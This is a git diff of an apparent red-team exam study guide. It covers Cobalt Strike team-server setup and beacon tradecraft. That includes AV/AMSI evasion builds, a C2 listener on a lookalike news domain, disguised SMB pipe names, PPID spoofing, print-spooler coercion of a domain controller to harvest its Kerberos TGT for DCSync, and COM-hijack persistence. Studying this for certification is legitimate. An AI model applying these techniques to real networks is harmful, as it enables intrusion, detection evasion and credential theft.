@@ -110,37 +110,36 @@ Seven phases, SOCKS required, three separate execution contexts that must stay s
 
 ---
 
-## Tier 2 — Full Dry Run (simulate exam day sequencing)
+## Tier 2 — Practice before exam day  
 
-### 6. [CS Team Server Setup]()  
+### 6. [CS Team Server Setup](/labs/2-Cobalt-Strike-Primer.md)  
 
 Do a complete cold-start dry run from the pre-exam checklist. Time yourself. Target: ready to receive first beacon within 30 minutes of starting.
 
-```
-[ ] SSH to team server
-[ ] Paste/edit Malleable C2 profile (stage + post-ex + process-inject blocks)
-[ ] docker restart cobaltstrike-cs-1 → docker logs — no [!]
-[ ] [Build Artifact Kit](/labs/defence-evasion-lab-Malleable.md) → ThreatCheck clean
-[ ] Build Resource Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
-[ ] Load in CS Script Manager (in order):
-      artifact.cna
-      resources.cna
-      SA.cna  ← MUST be before exam-recon.cna
-      Remote.cna
-      kerbeus_cs.cna
-      exam-recon.cna
-[ ] HTTP listener: Host = www.bleepincomputer.com, Port 80
-[ ] SMB listener: CUSTOM pipename — NOT TSVCPIPE-*, mojo.*, msagent_*, postex_*, MSSE-*
-[ ] DNS listener (for WMI persistence)
-[ ] TCP-local port 1337 (for SQL segment)
-[ ] Test beacon callback with Defender ON
-[ ] spawnto x64 %windir%\sysnative\werfault.exe
-[ ] ppid set to explorer.exe PID
-```
+* SSH to team server
+* Paste/edit Malleable C2 profile (stage + post-ex + process-inject blocks)
+* docker restart cobaltstrike-cs-1 → docker logs — no [!]
+* [Build Artifact Kit](/labs/defence-evasion-lab-Malleable.md) → ThreatCheck clean
+* Build Resource Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
+* Load in CS Script Manager (in order):
+  *    artifact.cna
+  *    resources.cna
+  *    SA.cna  ← MUST be before exam-recon.cna
+  *    Remote.cna
+  *    kerbeus_cs.cna
+  *    exam-recon.cna
+  *    sql.cna
+* HTTP listener: Host = www.bleepincomputer.com, Port 80  
+* SMB listener: CUSTOM pipename `PSHost.133946823881593750.1234.DefaultAppDomain.powershell`  
+* DNS listener (for WMI persistence)  
+* TCP-local port 1337 for SpoolSample / print spooler bug  
+* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
+* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
+* Test beacon callback with Defender ON  
 
 ---
 
-### 7. Unconstrained Delegation + Coercion path
+### 7. [Unconstrained Delegation Coercion path](/labs/Unconstrained-Delegation-Kerberos-lab.md)  
 
 Your notes cover passive TGT harvesting via `krb_triage`. Confirm the active coercion path for when no cached DA TGT exists:
 
@@ -150,6 +149,7 @@ beacon> krb_triage    // look for krbtgt ticket owned by dyork or DA account
 
 // Active coercion — if no cached DA TGT
 beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <DC-IP> <unconstrained-host-IP>
+
 // Then immediately:
 beacon> krb_triage    // catch DC machine account TGT that arrives
 
@@ -157,15 +157,13 @@ beacon> krb_dump /luid:<DC-LUID> /service:krbtgt
 // Use DC machine TGT for DCSync or S4U2Self path
 ```
 
-Lab file: `labs/Unconstrained-Delegation-Kerberos-lab.md`
-
 ---
 
 ### 8. Persistence sequencing (timing matters on exam day)
 
 The exam requires persistence before any break. Losing a beacon because you paused without persistence set costs OPSEC points and potentially the flag chain.
 
-**Sequence to internalise:**
+**Sequence**
 ```
 First beacon checks in
   → IMMEDIATELY: deploy COM hijack (user-level, no admin needed)
